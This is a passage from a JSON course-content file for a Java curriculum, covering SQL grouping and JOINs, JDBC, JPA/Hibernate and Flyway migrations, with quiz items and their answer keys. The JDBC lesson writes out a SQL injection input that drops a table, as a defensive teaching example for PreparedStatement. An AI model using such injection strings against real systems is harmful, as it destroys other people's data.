              "title": "GROUP BY - Grouping Results",
              "content": "GROUP BY combines rows with same values:\n\nSELECT age, COUNT(*) as student_count\nFROM students\nGROUP BY age;\n\nResult:\n| age | student_count |\n|-----|---------------|\n| 18  | 5             |\n| 19  | 8             |\n| 20  | 12            |\n| 21  | 7             |\n\nWITH AGGREGATES:\nSELECT age, AVG(gpa) as avg_gpa\nFROM students\nGROUP BY age;\n\nHAVING - Filtering Groups:\nSELECT age, COUNT(*) as count\nFROM students\nGROUP BY age\nHAVING count > 5;\n// Only show age groups with more than 5 students\n\nNOTE: WHERE filters ROWS, HAVING filters GROUPS"
            },
            {
              "type": "KEY_POINT",
              "title": "Query Order Matters!",
              "content": "SQL queries are executed in this order:\n\n1. FROM - Which table(s)\n2. WHERE - Filter rows\n3. GROUP BY - Group rows\n4. HAVING - Filter groups\n5. SELECT - Choose columns\n6. ORDER BY - Sort results\n7. LIMIT - Restrict number\n\nExample query using all:\n\nSELECT age, COUNT(*) as count, AVG(gpa) as avg_gpa\nFROM students\nWHERE email IS NOT NULL\nGROUP BY age\nHAVING count > 3\nORDER BY avg_gpa DESC\nLIMIT 5;"
            },
            {
              "type": "WARNING",
              "title": "Query Performance Pitfalls",
              "content": "1. AVOID SELECT * ON LARGE TABLES:\n   - Fetches all columns, wastes memory\n   - Specify only needed columns\n\n2. MISSING INDEXES:\n   - Queries on non-indexed columns are SLOW\n   - Add indexes on columns used in WHERE, ORDER BY, JOIN\n\n3. LIKE WITH LEADING WILDCARD:\n   - LIKE '%text' cannot use indexes = full table scan\n   - LIKE 'text%' CAN use indexes = faster\n\n4. NULL COMPARISONS:\n   - WHERE column = NULL never works!\n   - Use WHERE column IS NULL instead\n\n5. AGGREGATES WITHOUT GROUP BY:\n   - COUNT(*), SUM(), AVG() without GROUP BY = one result for entire table\n   - Easily missed mistake in complex queries"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "lesson-9-3-select-where",
              "title": "SQL SELECT with WHERE",
              "description": "What does 'SELECT * FROM students WHERE gpa > 3.5 ORDER BY gpa DESC' return?",
              "options": [
                "All students, sorted by GPA",
                "Students with GPA above 3.5, sorted highest first",
                "Students with GPA above 3.5, sorted lowest first",
                "The student with the highest GPA"
              ],
              "correctAnswer": 1,
              "explanation": "WHERE filters to gpa > 3.5, ORDER BY gpa DESC sorts descending (highest first). * selects all columns."
            }
          ]
        },
        {
          "id": "epoch-5-lesson-4",
          "title": "Lesson 9.4: JOINs - Connecting Tables",
          "moduleId": "module-06",
          "order": 4,
          "estimatedMinutes": 45,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Data Spread Across Tables",
              "content": "Imagine a school database:\n\nstudents table:\n| id | name  | age |\n|----|-------|-----|\n| 1  | Alice | 20  |\n| 2  | Bob   | 21  |\n\nenrollments table:\n| id | student_id | course_name     |\n|----|------------|----------------|\n| 1  | 1          | Math 101        |\n| 2  | 1          | Physics 201     |\n| 3  | 2          | Math 101        |\n\nHow do you find all courses Alice is enrolled in?\nYou need to CONNECT (JOIN) these tables!"
            },
            {
              "type": "THEORY",
              "title": "Foreign Keys - Linking Tables",
              "content": "A FOREIGN KEY references another table's PRIMARY KEY:\n\nCREATE TABLE enrollments (\n    id INT PRIMARY KEY AUTO_INCREMENT,\n    student_id INT,\n    course_name VARCHAR(100),\n    FOREIGN KEY (student_id) REFERENCES students(id)\n);\n\nstudent_id is a FOREIGN KEY:\n- Points to id in students table\n- Creates a relationship between tables\n- Enforces referential integrity\n\nYou can't:\n- Add enrollment with student_id = 999 (student doesn't exist)\n- Delete a student who has enrollments (without CASCADE)"
            },
            {
              "type": "THEORY",
              "title": "INNER JOIN - Matching Rows Only",
              "content": "INNER JOIN returns rows that exist in BOTH tables:\n\nSELECT students.name, enrollments.course_name\nFROM students\nINNER JOIN enrollments ON students.id = enrollments.student_id;\n\nResult:\n| name  | course_name |\n|-------|-------------|\n| Alice | Math 101    |\n| Alice | Physics 201 |\n| Bob   | Math 101    |\n\nBREAKDOWN:\n- FROM students: Start with students table\n- INNER JOIN enrollments: Connect to enrollments\n- ON students.id = enrollments.student_id: How they connect\n\nOnly includes students WHO HAVE enrollments."
            },
            {
              "type": "THEORY",
              "title": "LEFT JOIN - Keep All Left Side Rows",
              "content": "LEFT JOIN returns ALL rows from left table, even if no match:\n\nSELECT students.name, enrollments.course_name\nFROM students\nLEFT JOIN enrollments ON students.id = enrollments.student_id;\n\nIf student 'Carol' (id=3) has no enrollments:\n| name  | course_name |\n|-------|-------------|\n| Alice | Math 101    |\n| Alice | Physics 201 |\n| Bob   | Math 101    |\n| Carol | NULL        |  ← Carol included even with no enrollments\n\nUSE CASE:\nFind students who haven't enrolled in anything:\nSELECT students.name\nFROM students\nLEFT JOIN enrollments ON students.id = enrollments.student_id\nWHERE enrollments.id IS NULL;"
            },
            {
              "type": "KEY_POINT",
              "title": "JOINs are Like Matching Puzzle Pieces",
              "content": "INNER JOIN = Only matched pieces:\nStudent ⟷ Enrollment\n  🧩─🧩  (connected)\n  🧩─🧩  (connected)\n  🧩 (no match, excluded)\n\nLEFT JOIN = Keep all left pieces:\nStudent → Enrollment\n  🧩─🧩  (connected)\n  🧩─🧩  (connected)\n  🧩─❓  (student kept, enrollment NULL)\n\nThink of LEFT table as the \"main\" one you want to keep."
            },
            {
              "type": "THEORY",
              "title": "Many-to-Many Relationships",
              "content": "SCENARIO: Students can take many courses, courses have many students\n\nBAD DESIGN: Store courses in student table\nstudents:\n| id | name  | courses_taken          |\n|----|-------|------------------------|\n| 1  | Alice | Math 101, Physics 201  |  ← Hard to query!\n\nGOOD DESIGN: Junction table (join table)\n\nstudents:\n| id | name  |\n\ncourses:\n| id | course_name |\n\nenrollments (junction table):\n| student_id | course_id |\n|------------|----------|\n| 1          | 101      |\n| 1          | 201      |\n| 2          | 101      |\n\nTHREE-WAY JOIN:\nSELECT students.name, courses.course_name\nFROM students\nINNER JOIN enrollments ON students.id = enrollments.student_id\nINNER JOIN courses ON enrollments.course_id = courses.id;"
            },
            {
              "type": "WARNING",
              "title": "JOIN Gotchas to Avoid",
              "content": "1. CARTESIAN PRODUCT (Accidental Cross Join):\n   - Forgetting ON clause = rows multiply!\n   - 100 x 100 = 10,000 rows unexpectedly\n\n2. WRONG JOIN TYPE:\n   - INNER when you need LEFT = missing rows\n   - LEFT when you need INNER = unexpected NULLs\n\n3. AMBIGUOUS COLUMNS:\n   - SELECT name FROM A JOIN B = Error if both have 'name'\n   - Always use table prefixes: SELECT A.name, B.name\n\n4. N+1 QUERY PROBLEM:\n   - Looping through results and querying for each = SLOW\n   - Use a single JOIN instead of multiple queries\n\n5. JOINING ON WRONG COLUMNS:\n   - Always join PRIMARY KEY to FOREIGN KEY\n   - Verify column types match (INT to INT, not INT to VARCHAR)"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "lesson-9-4-join-types",
              "title": "JOIN Types",
              "description": "You want ALL students, even those not enrolled in any course. Which JOIN should you use?",
              "options": [
                "INNER JOIN",
                "LEFT JOIN from students",
                "RIGHT JOIN from courses",
                "CROSS JOIN"
              ],
              "correctAnswer": 1,
              "explanation": "LEFT JOIN keeps all rows from the left table (students) even if there's no match in the right table (enrollments)."
            }
          ]
        },
        {
          "id": "epoch-5-lesson-5",
          "title": "Lesson 9.5: JDBC - Databases + Java",
          "moduleId": "module-06",
          "order": 5,
          "estimatedMinutes": 45,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Java Needs to Talk to Databases",
              "content": "So far:\n- You know Java (objects, methods, classes)\n- You know SQL (SELECT, INSERT, JOIN)\n\nBut they're separate!\n\nHow do you run SQL from Java code?\nHow do you get query results into Java objects?\n\nSolution: JDBC (Java Database Connectivity)\n- Standard Java API for database access\n- Works with MySQL, PostgreSQL, Oracle, etc.\n- Lets you execute SQL from Java code"
            },
            {
              "type": "THEORY",
              "title": "JDBC Connection Steps",
              "content": "1. LOAD DRIVER (usually automatic now)\n2. ESTABLISH CONNECTION\n3. CREATE STATEMENT\n4. EXECUTE QUERY\n5. PROCESS RESULTS\n6. CLOSE RESOURCES\n\nCode example:\n\nimport java.sql.*;\n\npublic class DatabaseExample {\n    public static void main(String[] args) {\n        String url = \"jdbc:mysql://localhost:3306/school\";\n        String user = \"root\";\n        String password = \"password\";\n        \n        try (Connection conn = DriverManager.getConnection(url, user, password)) {\n            // Connection established!\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\ntry-with-resources automatically closes connection!"
            },
            {
              "type": "THEORY",
              "title": "Executing Queries - SELECT",
              "content": "Use Statement or PreparedStatement:\n\nString sql = \"SELECT * FROM students WHERE age > 20\";\n\ntry (Connection conn = DriverManager.getConnection(url, user, password);\n     Statement stmt = conn.createStatement();\n     ResultSet rs = stmt.executeQuery(sql)) {\n    \n    while (rs.next()) {  // Loop through results\n        int id = rs.getInt(\"id\");\n        String name = rs.getString(\"name\");\n        int age = rs.getInt(\"age\");\n        \n        System.out.println(id + \": \" + name + \", \" + age);\n    }\n}\n\nKEY POINTS:\n- ResultSet = cursor over query results\n- rs.next() = move to next row (returns false when done)\n- rs.getInt(\"column_name\") = get value by column name\n- rs.getString(1) = get by position (1-indexed)"
            },
            {
              "type": "THEORY",
              "title": "Executing Updates - INSERT, UPDATE, DELETE",
              "content": "Use executeUpdate() instead of executeQuery():\n\nINSERT:\nString sql = \"INSERT INTO students (name, age) VALUES ('Alice', 20)\";\ntry (Connection conn = DriverManager.getConnection(url, user, password);\n     Statement stmt = conn.createStatement()) {\n    \n    int rowsAffected = stmt.executeUpdate(sql);\n    System.out.println(\"Inserted \" + rowsAffected + \" row(s)\");\n}\n\nUPDATE:\nString sql = \"UPDATE students SET age = 21 WHERE name = 'Alice'\";\nint rowsAffected = stmt.executeUpdate(sql);\n\nDELETE:\nString sql = \"DELETE FROM students WHERE age < 18\";\nint rowsAffected = stmt.executeUpdate(sql);"
            },
            {
              "type": "THEORY",
              "title": "⚠️ SQL Injection - A Critical Security Risk!",
              "content": "NEVER concatenate user input directly into SQL:\n\n❌ DANGEROUS CODE:\nString userInput = \"Alice'; DROP TABLE students; --\";\nString sql = \"SELECT * FROM students WHERE name = '\" + userInput + \"'\";\n// Results in: SELECT * FROM students WHERE name = 'Alice'; DROP TABLE students; --'\n// YOUR TABLE JUST GOT DELETED!\n\n✓ SAFE CODE (PreparedStatement):\nString sql = \"SELECT * FROM students WHERE name = ?\";\ntry (PreparedStatement pstmt = conn.prepareStatement(sql)) {\n    pstmt.setString(1, userInput);  // Safe: input is escaped\n    ResultSet rs = pstmt.executeQuery();\n}\n\nALWAYS USE PREPAREDSTATEMENT WITH USER INPUT!"
            },
            {
              "type": "THEORY",
              "title": "PreparedStatement - The Right Way",
              "content": "PreparedStatement benefits:\n✓ Prevents SQL injection\n✓ Better performance (compiled once, reused)\n✓ Handles special characters automatically\n\nString sql = \"INSERT INTO students (name, age, email) VALUES (?, ?, ?)\";\n\ntry (PreparedStatement pstmt = conn.prepareStatement(sql)) {\n    // Set parameters (1-indexed)\n    pstmt.setString(1, \"Alice Johnson\");\n    pstmt.setInt(2, 20);\n    pstmt.setString(3, \"alice@example.com\");\n    \n    int rowsInserted = pstmt.executeUpdate();\n    System.out.println(\"Inserted: \" + rowsInserted);\n}\n\nBATCH INSERT (multiple rows):\npstmt.setString(1, \"Alice\");\npstmt.setInt(2, 20);\npstmt.addBatch();\n\npstmt.setString(1, \"Bob\");\npstmt.setInt(2, 21);\npstmt.addBatch();\n\nint[] results = pstmt.executeBatch();  // Execute all at once"
            },
            {
              "type": "WARNING",
              "title": "Critical JDBC Security and Resource Management",
              "content": "SECURITY RISKS:\n- SQL Injection was the #1 web vulnerability in 2023\n- NEVER concatenate user input into SQL strings\n- ALWAYS use PreparedStatement with ? placeholders\n\nRESOURCE LEAKS:\n- Unclosed connections exhaust database pool\n- Always use try-with-resources (Java 7+)\n- Close in order: ResultSet, Statement, Connection\n\nCONNECTION POOL EXHAUSTION:\n- Creating connections is expensive (100-500ms each)\n- Use HikariCP or similar pool in production\n- Set reasonable pool size (10-20 connections typical)\n\nCREDENTIAL EXPOSURE:\n- Never hardcode database passwords in source code\n- Use environment variables or secrets management\n- Rotate credentials regularly"
            },
            {
              "type": "KEY_POINT",
              "title": "JDBC Best Practices",
              "content": "1. ALWAYS USE TRY-WITH-RESOURCES\n   - Auto-closes connections, statements, resultsets\n   - Prevents resource leaks\n\n2. USE PREPAREDSTATEMENT, NOT STATEMENT\n   - Security (prevents SQL injection)\n   - Performance (pre-compiled)\n\n3. DON'T CONCATENATE SQL WITH USER INPUT\n   - Use ? placeholders\n   - Set parameters with setString(), setInt(), etc.\n\n4. USE CONNECTION POOLING IN PRODUCTION\n   - Libraries: HikariCP, Apache DBCP\n   - Reuse connections (expensive to create)\n\n5. HANDLE EXCEPTIONS PROPERLY\n   - Log errors\n   - Don't expose SQL details to users\n\n6. CLOSE RESOURCES IN FINALLY OR USE TRY-WITH-RESOURCES\n   - Connection leaks kill performance"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "lesson-9-5-prepared-stmt",
              "title": "Why PreparedStatement?",
              "description": "Why should you use PreparedStatement instead of concatenating SQL strings?",
              "options": [
                "PreparedStatement is faster",
                "PreparedStatement prevents SQL injection attacks",
                "PreparedStatement uses less memory",
                "PreparedStatement is easier to write"
              ],
              "correctAnswer": 1,
              "explanation": "PreparedStatement parameterizes queries, preventing attackers from injecting malicious SQL. String concatenation is a major security vulnerability."
            }
          ]
        },
        {
          "id": "epoch-5-lesson-6",
          "title": "Lesson 9.6: JPA and Hibernate - The ORM Solution",
          "moduleId": "module-06",
          "order": 6,
          "estimatedMinutes": 50,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: JDBC is Painful",
              "content": "Look at this JDBC code to get a student:\n\nString sql = \"SELECT * FROM students WHERE id = ?\";\ntry (PreparedStatement pstmt = conn.prepareStatement(sql)) {\n    pstmt.setInt(1, studentId);\n    try (ResultSet rs = pstmt.executeQuery()) {\n        if (rs.next()) {\n            Student s = new Student();\n            s.setId(rs.getInt(\"id\"));\n            s.setName(rs.getString(\"name\"));\n            s.setAge(rs.getInt(\"age\"));\n            s.setEmail(rs.getString(\"email\"));\n            return s;\n        }\n    }\n}\n\nPROBLEMS:\n- Tons of boilerplate for simple operations\n- Manual mapping between ResultSet and objects\n- SQL strings scattered throughout code\n- Easy to make mistakes (wrong column names)\n- Must handle connections, exceptions everywhere\n\nThere MUST be a better way..."
            },
            {
              "type": "THEORY",
              "title": "JPA - Java Persistence API",
              "content": "JPA is a SPECIFICATION for Object-Relational Mapping (ORM).\n\nIt lets you work with databases using JAVA OBJECTS instead of SQL:\n\n// With JPA - one line!\nStudent student = entityManager.find(Student.class, 123);\n\n// Save a student\nStudent newStudent = new Student(\"Alice\", 20);\nentityManager.persist(newStudent);\n\n// Update\nstudent.setAge(21);\n// That's it! Changes are automatically saved.\n\nKEY CONCEPT:\nYou work with OBJECTS, JPA handles the SQL.\n\nJPA is a specification. HIBERNATE is the most popular implementation.\nThink of it like: JPA = Interface, Hibernate = Implementation."
            },
            {
              "type": "THEORY",
              "title": "Entity Classes - Mapping Objects to Tables",
              "content": "An ENTITY is a Java class that maps to a database table:\n\nimport jakarta.persistence.*;\n\n@Entity\n@Table(name = \"students\")\npublic class Student {\n    \n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    \n    @Column(name = \"full_name\", nullable = false)\n    private String name;\n    \n    private int age;  // Maps to 'age' column automatically\n    \n    @Column(unique = true)\n    private String email;\n    \n    // Constructors, getters, setters...\n}\n\nANNOTATIONS EXPLAINED:\n@Entity - This class maps to a table\n@Table - Specify table name (optional if same as class)\n@Id - Primary key\n@GeneratedValue - Auto-increment\n@Column - Column customization (name, constraints)"
            },
            {
              "type": "THEORY",
              "title": "CRUD Operations with JPA",
              "content": "CREATE (persist):\nStudent student = new Student(\"Alice\", 20, \"alice@email.com\");\nentityManager.persist(student);\n// Hibernate generates: INSERT INTO students (name, age, email) VALUES (?, ?, ?)\n\nREAD (find):\nStudent student = entityManager.find(Student.class, 1L);\n// Hibernate generates: SELECT * FROM students WHERE id = ?\n\nUPDATE (automatic!):\nstudent.setAge(21);  // Just modify the object\n// Hibernate detects change and generates: UPDATE students SET age = ? WHERE id = ?\n\nDELETE (remove):\nentityManager.remove(student);\n// Hibernate generates: DELETE FROM students WHERE id = ?\n\nTHE MAGIC:\nJPA tracks entity state. Changes to managed entities are automatically persisted!"
            },
            {
              "type": "THEORY",
              "title": "JPQL - Querying with JPA",
              "content": "JPQL (Java Persistence Query Language) is like SQL but for entities:\n\n// Find all students\nList<Student> students = entityManager\n    .createQuery(\"SELECT s FROM Student s\", Student.class)\n    .getResultList();\n\n// With conditions\nList<Student> adults = entityManager\n    .createQuery(\"SELECT s FROM Student s WHERE s.age >= :age\", Student.class)\n    .setParameter(\"age\", 18)\n    .getResultList();\n\n// Single result\nStudent student = entityManager\n    .createQuery(\"SELECT s FROM Student s WHERE s.email = :email\", Student.class)\n    .setParameter(\"email\", \"alice@email.com\")\n    .getSingleResult();\n\nKEY DIFFERENCE FROM SQL:\n- Use entity/field names, not table/column names\n- SELECT s FROM Student s (not SELECT * FROM students)"
            },
            {
              "type": "THEORY",
              "title": "Relationships - Connecting Entities",
              "content": "@Entity\npublic class Student {\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    private String name;\n    \n    @OneToMany(mappedBy = \"student\", cascade = CascadeType.ALL)\n    private List<Enrollment> enrollments = new ArrayList<>();\n}\n\n@Entity\npublic class Enrollment {\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    \n    @ManyToOne\n    @JoinColumn(name = \"student_id\")\n    private Student student;\n    \n    @ManyToOne\n    @JoinColumn(name = \"course_id\")\n    private Course course;\n}\n\nRELATIONSHIP TYPES:\n@OneToOne - User has one Profile\n@OneToMany - Student has many Enrollments\n@ManyToOne - Enrollment belongs to one Student\n@ManyToMany - Students have many Courses, Courses have many Students"
            },
            {
              "type": "KEY_POINT",
              "title": "JPA vs JDBC - The Comparison",
              "content": "JDBC (Manual Labor):\n- Write SQL for every operation\n- Manually map ResultSet to objects\n- Handle connections, statements, exceptions\n- ~50 lines for a simple CRUD operation\n\nJPA (Automation):\n- Annotations define the mapping once\n- CRUD is 1-2 lines of code\n- Relationships handled automatically\n- Type-safe queries with JPQL\n\nWHEN TO USE EACH:\nJPA: 90% of applications - simpler, faster development\nJDBC: Complex queries, performance-critical code, legacy systems\n\nBUT: Understanding JDBC helps you debug JPA issues!\nThat's why we learned JDBC first."
            },
            {
              "type": "WARNING",
              "title": "JPA Pitfalls to Avoid",
              "content": "1. N+1 QUERY PROBLEM:\n   - Loading a list, then accessing relationships = many queries\n   - Fix: Use JOIN FETCH or @EntityGraph\n\n2. LAZY LOADING EXCEPTIONS:\n   - Accessing lazy relationships outside transaction = error\n   - Fix: Use @Transactional or fetch eagerly when needed\n\n3. ENTITY LIFECYCLE CONFUSION:\n   - Detached entities don't auto-save\n   - Use merge() to reattach\n\n4. OVERFETCHING:\n   - Don't load entire entities when you only need ID\n   - Use projections or DTOs for read operations\n\n5. MISSING @Transactional:\n   - JPA operations need transaction context\n   - Spring Boot: Add @Transactional to service methods\n\n6. BIDIRECTIONAL RELATIONSHIP BUGS:\n   - Must set both sides of relationship\n   - Use helper methods: student.addEnrollment(enrollment)"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "lesson-9-6-jpa-entity",
              "title": "JPA Annotations",
              "description": "Which annotation marks a class as a database entity in JPA?",
              "options": [
                "@Table",
                "@Entity",
                "@Repository",
                "@Model"
              ],
              "correctAnswer": 1,
              "explanation": "@Entity marks a class as a JPA entity (maps to a database table). @Table customizes the table name. @Repository is for Spring Data."
            }
          ]
        },
        {
          "id": "epoch-5-lesson-7",
          "title": "Lesson 9.7: Database Migrations with Flyway",
          "moduleId": "module-06",
          "order": 7,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Schema Changes in Production",
              "content": "Your app works locally. You deploy to production.\n\nThen you need to add a new column:\n\nALTER TABLE users ADD COLUMN phone VARCHAR(20);\n\nQUESTIONS:\n- Did you run this on production?\n- Did you run it on staging?\n- What about your teammate's database?\n- What about the test environment?\n\nPROBLEMS:\n- Manual SQL execution = human error\n- No record of what changed when\n- Different environments get out of sync\n- Rollbacks are a nightmare\n\nYou version control your CODE. Why not your DATABASE?"
            },
            {
              "type": "THEORY",
              "title": "Flyway - Version Control for Databases",
              "content": "Flyway manages database migrations:\n\n1. You write SQL migration files\n2. Flyway tracks which have been applied\n3. On startup, Flyway runs pending migrations\n4. Every environment stays in sync!\n\nHOW IT WORKS:\nsrc/main/resources/db/migration/\n  V1__create_users_table.sql\n  V2__add_email_column.sql\n  V3__create_orders_table.sql\n\nFlyway maintains a history table:\n| version | description          | installed_on        |\n|---------|----------------------|---------------------|\n| 1       | create users table   | 2025-01-15 10:30:00 |\n| 2       | add email column     | 2025-01-16 14:20:00 |\n\nOn startup:\n- Flyway checks: Which migrations are applied?\n- Runs only the NEW ones\n- Updates history table"
            },
            {
              "type": "THEORY",
              "title": "Setting Up Flyway in Spring Boot",
              "content": "STEP 1: Add dependency (build.gradle or pom.xml)\n\n// Gradle\ndependencies {\n    implementation 'org.flywaydb:flyway-core'\n}\n\n// Maven\n<dependency>\n    <groupId>org.flywaydb</groupId>\n    <artifactId>flyway-core</artifactId>\n</dependency>\n\nSTEP 2: Configure (application.properties)\n\nspring.flyway.enabled=true\nspring.flyway.locations=classpath:db/migration\n\nSTEP 3: Create migration folder\nsrc/main/resources/db/migration/\n\nThat's it! Spring Boot auto-configures Flyway.\nMigrations run automatically on startup."
            },
            {
              "type": "THEORY",
              "title": "Writing Migration Files",
              "content": "NAMING CONVENTION:\nV{version}__{description}.sql\n\nExamples:\nV1__create_users_table.sql\nV2__add_phone_to_users.sql\nV3__create_orders_table.sql\n\nRULES:\n- Version must be unique\n- Double underscore (__) separates version from description\n- Use underscores in description (no spaces)\n- Files are run in version order\n\nEXAMPLE: V1__create_users_table.sql\n\nCREATE TABLE users (\n    id BIGINT PRIMARY KEY AUTO_INCREMENT,\n    username VARCHAR(50) NOT NULL UNIQUE,\n    email VARCHAR(255) NOT NULL UNIQUE,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\nCREATE INDEX idx_users_email ON users(email);\n\nEXAMPLE: V2__add_phone_to_users.sql\n\nALTER TABLE users ADD COLUMN phone VARCHAR(20);"
            },
            {
              "type": "KEY_POINT",
              "title": "Migration Best Practices",
              "content": "1. MIGRATIONS ARE IMMUTABLE\n   - Never edit an applied migration\n   - Create a new migration to fix mistakes\n   - Flyway checksums prevent tampering\n\n2. EACH MIGRATION = ONE LOGICAL CHANGE\n   - V1: Create users table\n   - V2: Add phone column\n   - Don't mix unrelated changes\n\n3. MAKE MIGRATIONS REVERSIBLE (when possible)\n   - Think: How would I undo this?\n   - Document rollback steps in comments\n\n4. TEST MIGRATIONS BEFORE PRODUCTION\n   - Run on local database first\n   - Test on staging environment\n   - Never run untested migrations in production\n\n5. USE MEANINGFUL VERSION NUMBERS\n   - V1, V2, V3 for small projects\n   - V20250115_1 (date-based) for teams"
            },
            {
              "type": "THEORY",
              "title": "Handling Migration Failures",
              "content": "WHAT IF A MIGRATION FAILS?\n\nFlyway stops immediately. You must:\n\n1. Fix the SQL error\n2. Manually repair the database if partially applied\n3. Mark migration as applied or delete from history\n\nCOMMANDS:\n// Check migration status\nmvn flyway:info\n\n// Apply pending migrations\nmvn flyway:migrate\n\n// Repair checksum mismatches\nmvn flyway:repair\n\n// Delete all objects (DANGEROUS!)\nmvn flyway:clean\n\nSPRING BOOT ALTERNATIVE:\nAdd to application.properties:\nspring.flyway.repair=true  // Auto-repair on startup"
            },
            {
              "type": "WARNING",
              "title": "Migration Gotchas to Avoid",
              "content": "1. NEVER EDIT APPLIED MIGRATIONS\n   - Flyway checksums will fail\n   - Other environments will break\n   - Create a new migration instead\n\n2. TEST DATA MIGRATIONS\n   - Adding NOT NULL column to existing data = failure\n   - Add column, populate data, then add constraint\n\n3. LARGE DATA MIGRATIONS\n   - Locking tables in production = downtime\n   - Consider batch updates or online schema change tools\n\n4. COORDINATE WITH TEAM\n   - Pull before creating new migrations\n   - Avoid version conflicts (V3 exists twice)\n\n5. BACKUP BEFORE PRODUCTION MIGRATIONS\n   - Always. No exceptions.\n   - Test rollback procedure\n\n6. DON'T USE FLYWAY:CLEAN IN PRODUCTION\n   - It deletes EVERYTHING\n   - Only for local development"
            },
            {
              "type": "KEY_POINT",
              "title": "The Complete Database Workflow",
              "content": "LOCAL DEVELOPMENT:\n1. Create entity class with JPA annotations\n2. Write Flyway migration for schema\n3. Run app - Flyway creates table\n4. JPA handles all CRUD operations\n\nDEPLOYMENT:\n1. Push code (includes migration files)\n2. CI/CD deploys application\n3. App starts, Flyway runs pending migrations\n4. Database schema is now updated\n5. Application uses JPA to access data\n\nTHE STACK:\n- Flyway: Schema versioning and migrations\n- JPA/Hibernate: Object-relational mapping\n- JDBC: Low-level (JPA uses it internally)\n- SQL: The language that makes it all work\n\nEach layer builds on the previous one!"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "lesson-9-7-flyway",
              "title": "Flyway Naming",
              "description": "What is the correct Flyway migration file naming convention?",
              "options": [
                "migration_1.sql",
                "V1__create_users.sql",
                "1_create_users.sql",
                "create_users_v1.sql"
              ],
              "correctAnswer": 1,
              "explanation": "Flyway uses V{version}__{description}.sql format. The V prefix and double underscore are required. Version determines execution order."
            }
          ]
        }
      ],
      "order": 9
    },
    {
      "id": "module-07",
      "title": "Web Fundamentals and APIs",
      "description": "Understand HTTP, REST APIs, and consuming web services with HttpClient.",
      "difficulty": "beginner",
      "estimatedHours": 1.9,
      "lessons": [
        {
          "id": "epoch-6-lesson-1",
          "title": "Lesson 10.1: How Does the Web Actually Work?",
          "moduleId": "module-07",
          "order": 1,
          "estimatedMinutes": 30,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Programs That Talk Over the Internet",
              "content": "So far, your programs run on ONE computer.\n\nBut modern apps need to:\n- Let users access from anywhere (phone, laptop, tablet)\n- Share data between users\n- Update in real-time\n\nExample: Instagram\n- You post a photo from your phone\n- Your friend sees it on their laptop\n- How did the photo get there?\n\nThis requires CLIENT-SERVER architecture."
            },
            {
              "type": "KEY_POINT",
              "title": "The Web is Like a Restaurant",
              "content": "YOU (Client):\n- Sit at a table\n- Look at menu\n- Order food: \"I'll have the pasta\"\n\nKITCHEN (Server):\n- Receives your order\n- Prepares the food\n- Sends it back to you\n\nWAITER (HTTP Protocol):\n- Carries messages between you and kitchen\n- Speaks a specific language (HTTP)\n\nIn web terms:\n- Your browser = Client (customer)\n- Java server = Server (kitchen)\n- HTTP = Protocol (waiter's language)"
            },
            {
              "type": "THEORY",
              "title": "HTTP Requests and Responses",
              "content": "When you visit a website:\n\n1. CLIENT SENDS REQUEST:\nGET /api/users/123 HTTP/1.1\nHost: example.com\n\nThis means: \"Give me information about user 123\"\n\n2. SERVER PROCESSES REQUEST:\n- Looks up user 123 in database\n- Prepares the data\n\n3. SERVER SENDS RESPONSE:\nHTTP/1.1 200 OK\nContent-Type: application/json\n{\"name\": \"Alice\", \"age\": 20}\n\nCommon HTTP methods:\n- GET: Retrieve data (\"show me\")\n- POST: Create data (\"save this\")\n- PUT: Update data (\"change this\")\n- DELETE: Remove data (\"delete this\")"
            },
            {
              "type": "WARNING",
              "title": "Web Development Considerations",
              "content": "IMPORTANT CONCEPTS FOR REAL-WORLD WEB DEVELOPMENT:\n\n1. HTTPS IS MANDATORY\n   - Never use plain HTTP in production\n   - All modern browsers flag HTTP as insecure\n   - SSL/TLS encrypts data in transit\n\n2. CORS (Cross-Origin Resource Sharing)\n   - Browsers block requests to different domains by default\n   - Backend must explicitly allow frontend origins\n   - Spring Boot: Use @CrossOrigin or configure WebMvcConfigurer\n\n3. THIS COURSE IS SIMPLIFIED\n   - Real web apps need authentication, rate limiting\n   - Production requires proper error handling and logging\n   - Security headers (CSP, HSTS) are essential\n\n4. API DESIGN MATTERS\n   - RESTful conventions make APIs predictable\n   - Versioning prevents breaking changes\n   - Documentation (OpenAPI/Swagger) is essential"
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-6-lesson-2",
          "title": "Lesson 10.2: REST APIs - The Standard for Web Services",
          "moduleId": "module-07",
          "order": 2,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "What is a REST API?",
              "content": "REST = Representational State Transfer\n\nA REST API is a set of rules for building web services:\n\nKEY PRINCIPLES:\n1. Resources identified by URLs\n2. HTTP methods define actions\n3. Stateless (each request independent)\n4. JSON for data exchange\n\nEXAMPLE API:\nGET    /api/users        → Get all users\nGET    /api/users/123    → Get user with ID 123\nPOST   /api/users        → Create new user\nPUT    /api/users/123    → Update user 123\nDELETE /api/users/123    → Delete user 123"
            },
            {
              "type": "THEORY",
              "title": "HTTP Methods - The Verbs",
